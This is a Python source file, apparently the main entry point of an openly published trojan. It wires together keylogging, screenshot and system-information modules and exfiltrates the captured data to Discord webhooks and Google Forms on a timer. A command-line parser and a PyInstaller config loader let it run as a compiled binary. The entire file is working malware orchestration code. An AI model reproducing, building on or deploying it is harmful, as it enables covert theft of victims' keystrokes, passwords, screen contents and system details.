#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import argparse
import configparser
import os
import platform
import sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from uuid import uuid4

from src.modules import (
    Discord,
    GoogleForms,
    KeyLogger,
    ScreenShot,
    SystemInformation
)


class Trojan:
    def __init__(self, *,
                 exfil_time: float,
                 discord_webhook: str = None,
                 google_forms_url: str = None):
        """Set up a Trojan composed of exploitation and exfiltration
        modules.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to
            None to perform a single operation.
        :param discord_webhook: URL of a Webhook for the Discord server.
        :param google_forms_url: URL of a remote instance of Google
            Forms.
        """
        self.exfil_time = exfil_time
        self.webhook = discord_webhook
        self.forms_url = google_forms_url

    @property
    def screenshot_path(self) -> str:
        """Gets a platform-dependent absolute path for the screenshot
        file."""

        '''Set a random name for the screenshot file. The '.jpeg' 
        extension is only required as a convenience for the generation 
        of an image preview by the Discord server. It can be safely 
        suppressed.'''
        filename = f"{str(uuid4())}.jpeg"
        if platform.system() == "Windows":
            app_data = os.path.expandvars(r"%LOCALAPPDATA%")
            path = os.path.join(app_data, "Temp", filename)
        else:  # Linux/Unix/MacOS
            path = f"/tmp/{filename}"
        return path

    @property
    def modules(self) -> set[KeyLogger, ScreenShot, SystemInformation]:
        """Gets a set of initialized ExploitationModule instances."""
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(exfil_time=self.exfil_time,
                       image_path=self.screenshot_path),
            SystemInformation()
        }

    def execute(self) -> None:
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module, webhook_url=self.webhook)
                if type(module) != ScreenShot:
                    GoogleForms(module=module, form_url=self.forms_url)
                executor.submit(module.execute)


def cli_parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="BCA Trojan - Log keystrokes, takes screenshots, grab "
                    "system information and exfiltrate to Discord and Google "
                    "Forms"
    )
    parser.add_argument(
        "-w", "--webhook",
        type=str,
        metavar="<webhook_url>",
        help="URL of a Webhook for the Discord server."
    )
    parser.add_argument(
        "-f", "--forms",
        type=str,
        metavar="<google_forms_url>",
        help="URL of a remote instance of Google Forms."
    )
    parser.add_argument(
        "-e", "--exfil-time",
        type=float,
        metavar="<seconds>",
        default=30,
        help="Time in seconds to wait between periodic executions of the "
             "exfiltration of logged data. Defaults to 30 seconds. Set to None "
             "to perform a single operation."
    )

    args = parser.parse_args()

    if not any((args.webhook, args.forms)):
        raise SystemExit(
            "Error: At least one exfiltration method is required to run/build "
            "the application. Set a Discord webhook and/or a Google Forms "
            "URL and try again."
        )

    return args


if __name__ == "__main__":
    try:
        '''Trojan is executed as a binary compiled by PyInstaller. All 
        configuration options are read from the 'trojan.cfg' file that 
        is bundled in the binary during the build process defined in the 
        'build.py' file. In this case the location of all added data 
        will be a temporary directory set by sys._MEIPASS. If such 
        directory does not exist then an AttributeError is raised.'''
        tmp_dir = Path(sys._MEIPASS)
        config = configparser.ConfigParser()
        config.read(tmp_dir.joinpath("trojan.cfg"))
        client_cfg = config["TROJAN"]
        Trojan(
            discord_webhook=client_cfg.get("Webhook"),
            google_forms_url=client_cfg.get("GoogleFormsUrl"),
            exfil_time=client_cfg.getint("ExfiltrationTime")
        ).execute()
    except AttributeError:
        '''Trojan is executed from source code by the system interpreter 
        for development purposes. All configuration options are parsed 
        from the CLI.'''
        _args = cli_parser()
        Trojan(
            discord_webhook=_args.webhook,
            google_forms_url=_args.forms,
            exfil_time=_args.exfil_time
        ).execute()
